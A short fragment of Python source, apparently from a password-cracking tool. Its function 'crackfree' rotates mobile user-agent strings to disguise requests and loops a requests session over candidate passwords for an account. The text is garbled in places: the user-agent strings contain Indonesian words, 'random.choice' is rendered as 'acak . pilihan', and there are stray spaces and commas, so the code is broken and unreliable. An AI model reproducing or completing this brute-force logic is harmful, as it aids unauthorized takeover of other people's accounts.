...
def crackfree(idf,pwv):
	...
	sys.stdout.flush()
	ua = random.choice([([ 'Mozilla/5.0 (Linux; Android 9; SM-A205F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/111.0.0.0 Mobile Safari/537.36' , 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM- G955F) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36' , ' Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908E) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser /20.0 Chrome/106.0.5249.126 Mobile Safari/537.36' , 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A426B/A426BXXS4DVK5) AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/ 537,36' ])
	ua2  =  acak . pilihan ( ugen2 )
	ses = requests.Session()
	for pw in pwv:
		try:
